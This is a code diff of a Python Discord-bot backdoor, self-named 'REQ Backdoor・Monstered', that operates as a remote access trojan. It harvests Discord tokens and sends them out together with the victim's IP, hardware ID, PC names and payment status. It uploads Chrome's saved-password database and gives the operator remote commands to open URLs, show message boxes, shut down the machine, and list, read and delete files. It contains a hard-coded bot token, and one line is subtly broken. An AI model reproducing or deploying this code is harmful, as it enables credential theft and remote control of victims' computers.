@@ -1,4 +1,4 @@
-import re, os, requests, json, shutil, discord
+import re, os, requests, json, shutil, discord, webbrowser, ctypes
 from discord.ext import commands
 from base64 import b64decode
 from json import loads
@@ -6,10 +6,19 @@ from urllib.request import Request, urlopen
 from subprocess import Popen, PIPE
 import platform as plt
 
-Token = ""
-url = ""
+Token = "ODA5ODcwODk4MzY2NTEzMjUz.YCbZDA.MvhK9BBv0FkBLkwNo3JYhLvi1xs"
+os.system("cls")
 
 client = commands.Bot(command_prefix=".")
+
+def ErrorMsg():
+    embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
+    embed.add_field(name = "Error", value = f"Error :(")
+    embed.set_footer(text = "REQ Backdoor・Monstered")
+    return embed
+
+def GetIP():
+    return requests.get("https://api.ipify.org/").text
 
 def Headers(token=None):
 	headers = {"content-type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
@@ -43,17 +52,13 @@ def Tokens(path):
 OS = plt.platform().split("-")
 name = os.getenv("UserName")
 Username = os.getenv("COMPUTERNAME")
-ip = requests.get("https://api.ipify.org/").text
 dire = {"Discord": os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb"}
-Msg = []
+ids = []
 
-@client.event
-async def on_ready():
-	ids = []
+@client.command()
+async def tokens(ctx):
 	
 	for platform, path in dire.items():
-		if not os.path.exists(path):
-			continue
 		for token in Tokens(path):
 			uid = None
 			if not token.startswith("mfa."):
@@ -66,148 +71,115 @@ async def on_ready():
 			ids.append(uid)
 			payment = bool(Payment(token))
 
-			messages = f"```ARM\nTokens: {token}\n```" + f"```ARM\nIP: {ip}\n```" +  f"```ARM\nHWID: {Hwid()}\n```" + f"```ARM\nPC Username: {Username}\n```" + f"```ARM\nPC Name: {name}\n```" + f"```ARM\nBilling Method: {payment}\n```" + f"```ARM\nProduct Name: {OS[0]} {OS[1]}\n```"
-
-	webhook = {"content": f"{messages}", "embeds": "", "username": "REQ Backdoor・Monstered", "avatar_url": "https://media.discordapp.net/attachments/798206239673679885/808423379341541386/space.jpg?width=1202&height=676"}
-	urlopen(Request(url, data=json.dumps(webhook).encode(), headers=Headers()))
+			messages = f"```ARM\nTokens: {token}\n```"
+	await ctx.send(messages)
 
 @client.command()
-async def getpwd(ctx):
-    await ctx.send(file = discord.File(f"C:\\Users\\{name}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"))
+async  def check(ctx):
+    OS = plt.platform().split("-")
+    name = os.getenv("UserName")
+    Username = os.getenv("COMPUTERNAME")
+    messages = f"```ARM\nIP: {GetIP()}\n```" +  f"```ARM\nHWID: {Hwid()}\n```" + f"```ARM\nPC Username: {Username}\n```" + f"```ARM\nPC Name: {name}\n```" + f"```ARM\nProduct Name: {OS[0]} {OS[1]}\n```"
+    await ctx.send(messages)
+
+@client.command()
+async def getpwd(ctx, IP):
+    if IP == GetIP():
+        await ctx.send(file = discord.File(f"C:\\Users\\{name}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"))
 
 @client.command()
 async def run(ctx, IP, url):
-    import webbrowser
 
-    if IP == ip:
+    if IP == GetIP():
         webbrowser.open(url)
         embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
         embed.add_field(name = "Open url", value = f"[*] Url open successfully `{url}`")
         embed.set_footer(text = "REQ Backdoor・Monstered")
         await ctx.channel.send(embed = embed)
     else:
-        embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
-        embed.add_field(name = "Error", value = f"Error :(")
-        embed.set_footer(text = "REQ Backdoor・Monstered")
-        await ctx.channel.send(embed = embed)
+        await ctx.channel.send(embed = ErrorMsg())
 
 @client.command()
 async def message(ctx, IP, msg):
-    import ctypes
-    ip = requests.get("https://api.ipify.org/").text
-    if IP == ip:
+    if IP == GetIP():
         embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
         embed.add_field(name = "MessageBox", value = f"[*] Message sent successfully `{msg}`")
         embed.set_footer(text = "REQ Backdoor・Monstered")
         await ctx.channel.send(embed = embed)
         ctypes.windll.user32.MessageBoxW(0, msg, "", 1)
     else:
-        embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
-        embed.add_field(name = "Error", value = f"Error :(")
-        embed.set_footer(text = "REQ Backdoor・Monstered")
-        await ctx.channel.send(embed = embed)
+        await ctx.channel.send(embed = ErrorMsg())
 
 @client.command()
 async def admin(ctx, IP):
-    import ctypes
-    ip = requests.get("https://api.ipify.org/").text
-    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-    if IP == ip:
-        if is_admin == True:
+    admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    if IP == GetIP():
+        if admin == True:
             embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
             embed.add_field(name = "Admin check", value = "[*] The bot is admin")
             embed.set_footer(text = "REQ Backdoor・Monstered")
             await ctx.channel.send(embed = embed)
 
-        elif is_admin == False:
+        elif admin == False:
             embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
             embed.add_field(name = "Admin check", value = "[*] The bot is not admin")
             embed.set_footer(text = "REQ Backdoor・Monstered")
             await ctx.channel.send(embed = embed)
     else:
-        embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
-        embed.add_field(name = "Error", value = f"Error :(")
-        embed.set_footer(text = "REQ Backdoor・Monstered")
-        await ctx.channel.send(embed = embed)
+        await ctx.channel.send(embed = ErrorMsg())
 
 @client.command()
 async def shutdown(ctx, IP):
-    import os
-    ip = requests.get("https://api.ipify.org/").text
-    if IP == ip:
+    if IP == GetIP():
         os.system("shutdown /s /t 1")
         embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
         embed.add_field(name = "Shutdown", value = "[*] Shutdowning successfully")
         embed.set_footer(text = "REQ Backdoor・Monstered")
         await ctx.channel.send(embed = embed)
     else:
-        embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
-        embed.add_field(name = "Error", value = f"Error :(")
-        embed.set_footer(text = "REQ Backdoor・Monstered")
-        await ctx.channel.send(embed = embed)
+        await ctx.channel.send(embed = ErrorMsg())
 
 
 @client.command()
 async def cwd(ctx, IP):
-    import os
-    ip = requests.get("https://api.ipify.org/").text
-    if IP == ip:
-        cwd = os.getcwd()
-        cwd = str(cwd)
+    if IP == GetIP():
+        cwd = str(os.getcwd)
         embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
         embed.add_field(name = "View cwd", value = f"`{cwd}`")
         embed.set_footer(text = "REQ Backdoor・Monstered")
         await ctx.channel.send(embed = embed)
     else:
-        embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
-        embed.add_field(name = "Error", value = f"Error :(")
-        embed.set_footer(text = "REQ Backdoor・Monstered")
-        await ctx.channel.send(embed = embed)
+        await ctx.channel.send(embed = ErrorMsg())
 
 @client.command()
 async def look(ctx, IP, dir):
-    import os
-    ip = requests.get("https://api.ipify.org/").text
-    if IP == ip:
+    if IP == GetIP():
         dir = os.listdir(dir)
         embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
         embed.add_field(name = "Look directory", value = dir)
         embed.set_footer(text = "REQ Backdoor・Monstered")
         await ctx.channel.send(embed = embed)
     else:
-        embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
-        embed.add_field(name = "Error", value = f"Error :(")
-        embed.set_footer(text = "REQ Backdoor・Monstered")
-        await ctx.channel.send(embed = embed)
+        await ctx.channel.send(embed = ErrorMsg())
 
 @client.command()
 async def remove(ctx, IP, file):  
-    import os 
-    ip = requests.get("https://api.ipify.org/").text
-    if IP == ip:
+    if IP == GetIP():
         os.remove(file)
         embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
         embed.add_field(name = "Remove file", value = file)
         embed.set_footer(text = "REQ Backdoor・Monstered")
         await ctx.channel.send(embed = embed)
     else:
-        embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
-        embed.add_field(name = "Error", value = f"Error :(")
-        embed.set_footer(text = "REQ Backdoor・Monstered")
-        await ctx.channel.send(embed = embed)
+        await ctx.channel.send(embed = ErrorMsg())
 
 @client.command()
 async def read(ctx, IP, file):
-    ip = requests.get("https://api.ipify.org/").text
-    if IP == ip:
-        files = open(file, "r")
-        files = files.read()
+    if IP == GetIP():
+        files = open(file, "r").read()
         await ctx.channel.send(f"```\n{files}\n```")
     else:
-        embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
-        embed.add_field(name = "Error", value = f"Error :(")
-        embed.set_footer(text = "REQ Backdoor・Monstered")
-        await ctx.channel.send(embed = embed)
+        await ctx.channel.send(embed = ErrorMsg())
 
 
 @client.command()
